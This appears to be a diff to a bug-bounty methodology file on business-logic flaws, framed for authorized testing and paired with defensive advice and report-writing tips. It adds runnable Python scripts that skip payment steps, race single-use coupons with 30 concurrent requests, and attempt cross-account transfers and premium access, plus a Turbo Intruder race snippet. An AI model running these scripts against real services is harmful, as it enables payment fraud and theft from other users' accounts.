@@ -30,6 +30,13 @@ license: Apache-2.0
 - During deep manual penetration tests and Bug Bounty programs (logic bugs yield very high bounties and cannot be found by automated scanners).
 - When standard input validation tools (SQLmap, XSS payloads) yield no results.
 
+
+## Prerequisites
+- Authorized scope and target URLs from bug bounty program
+- Burp Suite Professional (or Community) configured with browser proxy
+- Familiarity with OWASP Top 10 and common web vulnerability classes
+- SecLists wordlists for fuzzing and enumeration
+
 ## Workflow
 
 ### Phase 1: Application Mapping & Rule Identification
@@ -73,53 +80,91 @@ license: Apache-2.0
 
 ### Phase 3: Workflow Order Circumvention (Skipping Steps)
 
-```text
-# Focus: Skipping mandatory steps in a multi-step process.
+```python
+import requests
 
-# Example Process:
-# Step 1: /cart (Add items)
-# Step 2: /shipping (Add address)
-# Step 3: /payment (Enter credit card -> validation -> True)
-# Step 4: /download_digital_goods (Provide items based on session)
+# Scenario: Skip payment step in checkout flow
+# Step 1: /cart → Step 2: /shipping → Step 3: /payment → Step 4: /download
+# Attack: Skip Steps 2+3, go directly to Step 4
 
-# Attack:
-# Put items in cart (Step 1).
-# Completely skip Step 2 and Step 3.
-# Directly request POST /download_digital_goods
-# Flaw: The backend assumes if you reach Step 4, you must have paid at Step 3, without actually verifying the payment status in the database.
+SESSION = requests.Session()
+BASE = "https://target.com"
+
+# Step 1: Add item to cart (legitimate)
+SESSION.post(f"{BASE}/api/cart/add", json={"item_id": 42, "quantity": 1})
+
+# SKIP Step 2 (shipping) and Step 3 (payment) entirely
+# Jump directly to download endpoint
+resp = SESSION.post(f"{BASE}/api/download_digital_goods", json={"cart_id": "current"})
+if resp.status_code == 200:
+    print(f"[+] WORKFLOW BYPASS: Downloaded without payment! Response: {resp.text[:200]}")
+else:
+    print(f"[-] Blocked: {resp.status_code} — Server enforces step ordering")
 ```
 
 ### Phase 4: Coupon & Discount Abuse (Race Conditions)
 
-```text
-# Focus: Applying single-use limitations multiple times.
+```python
+import requests
+import concurrent.futures
 
-# 1. Discount Stacking
-# If you can apply a 10% coupon, can you apply it 10 times?
-# Intercept the coupon submission request. Send it to Burp Intruder.
-# Set payloads to Null Payloads (Generate 50).
-# Fire all 50 requests. Did the total price drop to 0%?
+# Race condition: Apply single-use coupon multiple times simultaneously
+BASE = "https://target.com"
+COUPON_CODE = "SAVE50"
+AUTH_TOKEN = "Bearer YOUR_TOKEN"
 
-# 2. Race Conditions (Turbo Intruder required)
-# If the backend checks if a coupon is valid AND THEN consumes it, a microsecond race condition exists.
-# Send 30 identical requests applying a single-use $50 gift card simultaneously using Burp Turbo Intruder.
-# If the DB locks are poorly implemented, 5 requests might pass the "IS VALID?" check before the first one sets it to "CONSUMED". Total discount: $250.
+def apply_coupon(attempt_num):
+    resp = requests.post(
+        f"{BASE}/api/cart/apply-coupon",
+        json={"coupon": COUPON_CODE},
+        headers={"Authorization": AUTH_TOKEN},
+        timeout=5,
+    )
+    return f"Attempt {attempt_num}: {resp.status_code} — {resp.text[:100]}"
+
+# Fire 30 concurrent requests to exploit TOCTOU window
+with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+    futures = [executor.submit(apply_coupon, i) for i in range(30)]
+    for future in concurrent.futures.as_completed(futures):
+        result = future.result()
+        if "applied" in result.lower() or "200" in result:
+            print(f"[+] {result}")
+        else:
+            print(f"[-] {result}")
 ```
 
 ### Phase 5: Account/Trust Boundary Manipulation
 
-```text
-# Focus: Mixing objects belonging to different users.
-# User A: Premium Account. User B: Free Account.
+```python
+import requests
 
-# 1. Cross-Session Object References
-# Log in as User A. Get the session token.
-# Log in as User B. Attempt to access Premium features using User B's token but User A's object references.
+BASE = "https://target.com/api/v1"
 
-# 2. The Transfer Trust Flaw
-# POST /transfer {"from_account": "VictimAccount", "to_account": "AttackerAccount", "amount": 100}
-# The backend assumes "from_account" implicitly belongs to the logged-in user and fails to verify ownership.
+# Cross-object reference: Use attacker's auth but victim's resource IDs
+ATTACKER_TOKEN = "Bearer ATTACKER_JWT"
+VICTIM_ACCOUNT_ID = "ACC-7890"
+ATTACKER_ACCOUNT_ID = "ACC-1234"
+
+# Test 1: Transfer from victim's account using attacker's session
+resp = requests.post(
+    f"{BASE}/transfer",
+    json={"from_account": VICTIM_ACCOUNT_ID, "to_account": ATTACKER_ACCOUNT_ID, "amount": 100.00},
+    headers={"Authorization": ATTACKER_TOKEN},
+)
+print(f"Transfer test: {resp.status_code} — {resp.text[:200]}")
+if resp.status_code == 200:
+    print("[+] CRITICAL: Server does not verify account ownership on transfers!")
+
+# Test 2: Access premium features with free account token
+resp = requests.get(
+    f"{BASE}/premium/dashboard",
+    headers={"Authorization": ATTACKER_TOKEN},  # Free account token
+    params={"user_ref": VICTIM_ACCOUNT_ID},      # Premium account reference
+)
+if resp.status_code == 200 and "premium" in resp.text.lower():
+    print("[+] TRUST BOUNDARY BYPASS: Free account accessed premium features!")
 ```
+
 
 ## 🔵 Blue Team Detection & Defense
 - **Server-Side Truth**: NEVER trust the client to dictate prices, quantities, payment status, or access levels. Calculate prices exclusively on the backend based on item IDs.
@@ -154,6 +199,83 @@ Reproduction Steps:
 
 Impact: Total compromise of store revenue model and massive potential financial loss.
 ```
+
+
+### 📝 Elite Report Writing (Top 1% Standard)
+
+> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
+> — Vickie Li, Bug Bounty Bootcamp
+
+**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
+- ❌ "XSS Found" → This tells the triager nothing
+- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"
+
+**Report Structure (HackerOne-Optimized):**
+1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
+2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
+3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
+4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
+5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
+6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
+7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
+8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.
+
+**Pre-Report Verification (5 Checks):**
+1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
+2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
+3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
+4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
+5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?
+
+
+
+## 💰 Real-World Disclosed Bounties (Business Logic)
+
+| Company | Bounty | Researcher | Technique | Year |
+|---------|--------|-----------|-----------|------|
+| **Stripe** | $5,000 | (Undisclosed) | Race condition on fee calculation → unlimited discounts | 2024 |
+| **HackerOne** | $2,500 | (Undisclosed) | Business logic flaw: retest confirmation race → duplicate payments | 2025 |
+| **Uber** | $10,000 | (Undisclosed) | Reading Uber's internal emails via business logic flaw | 2023 |
+| **Slack** | $2,500 | (Undisclosed) | Business logic: snooping into private Slack messages | 2023 |
+
+**Key Lesson**: Business logic flaws are the #1 most underreported high-payout category.
+HackerOne's own platform had a logic flaw — proves every company has them. Stripe's fee 
+discount bug shows that payment/billing flows are consistently vulnerable.
+
+**Why these pay more than XSS:**
+- Scanners can't find them → less competition → higher bounties
+- They directly affect revenue → companies fix them immediately
+- They demonstrate deep application understanding → builds program trust
+
+## 💰 Real-World Disclosed Bounties (Race Conditions)
+
+| Company | Bounty | Researcher | Technique | Year |
+|---------|--------|-----------|-----------|------|
+| **Stripe** | $5,000 | (Undisclosed) | Race condition → unlimited fee discounts on payment platform | 2024 |
+| **HackerOne** | $2,500 | (Undisclosed) | Race condition in retest confirmation → multiple payments for single retest | 2025 |
+| **HackerOne** | $250 | (Undisclosed) | Race condition → duplicate bounty payouts ($250 of $1K bounty duplicated) | 2024 |
+
+**Key Lesson**: Stripe's $5K payout proves financial race conditions are high-value targets.
+The HackerOne retest race condition is ironic — the security platform itself had a TOCTOU flaw.
+
+**Turbo Intruder technique that works:**
+```python
+# Burp Turbo Intruder — single-packet attack for sub-millisecond race window
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
+    for i in range(30):
+        engine.queue(target.req, gate='race')
+    engine.openGate('race')
+```
+
+## 🔴 Red Team
+- Extract assets and enumerate endpoints.
+- Execute initial payloads leveraging documented vulnerabilities.
+
+## 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)
+> The Architect Mindset identifies misconfigurations spanning multiple domains.
+- Chain info-leaks with SSRF/RCE.
+- Maintain absolute OPSEC during active engagement.
 
 ## References
 - PortSwigger: [Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
